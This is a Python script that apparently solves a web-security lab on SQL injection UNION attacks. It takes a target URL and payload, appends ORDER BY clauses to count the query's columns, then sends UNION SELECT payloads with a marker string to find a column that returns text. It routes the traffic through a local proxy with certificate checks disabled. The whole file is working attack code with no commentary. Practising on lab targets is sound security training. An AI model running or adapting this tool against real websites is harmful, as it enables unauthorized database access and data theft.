#SQL injection UNION attack, finding a column containing text

import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

def main():
    try:
        url=sys.argv[1].strip()
        payload=sys.argv[2].strip()
        exploit(url,payload)
    except IndexError:
        print("[-] Usage %s <url> <payload>"%sys.argv[0])
        sys.exit(0)

def exploit(url,payload):
        url=url+"filter?category=Pets"+payload
        for i in range(1,10):
            fuzz=url+" order by "+str(i)+" --"
            r=requests.get(fuzz,verify=False,proxies=proxies)
            if(r.status_code!=200):
                print("[+] Found No.of Cols Using Order by : "+str(i-1))
                check_no_cols(url,(i-1),payload)
                sys.exit()

def check_no_cols(url,cols,payload):

    fuzz=url+" union select"+" null,"*(cols-1)+"null --"
    print("[+] checking query :")
    print(fuzz)
    r=requests.get(fuzz,verify=False,proxies=proxies)
    if(r.status_code==200):
        print("[+] Request success ")
        print("[+] Finding String Column ")
        string_col_position=finding_string_col(url,cols)
        if string_col_position:
            print("[+] Found String Column : "+str(string_col_position))
            sys.exit()
        else:
            print("[-] Not able to find string column")
            sys.exit()
    else:
        print("[-] Request Failed")
    
def finding_string_col(url,cols):
    
    for i in range(1,cols+1):
        string ="'MF6BGk'"
        payload_list=["null"]*cols
        payload_list[i-1]=string
        fuzz=url+" union select "+" ,".join(payload_list)+" --"
        
        r=requests.get(fuzz,verify=False,proxies=proxies)
        
        if string.strip("\'") in r.text:
            print("[+] Found string with below query : ")
            print(fuzz)
            return i


if __name__=="__main__":
    main() 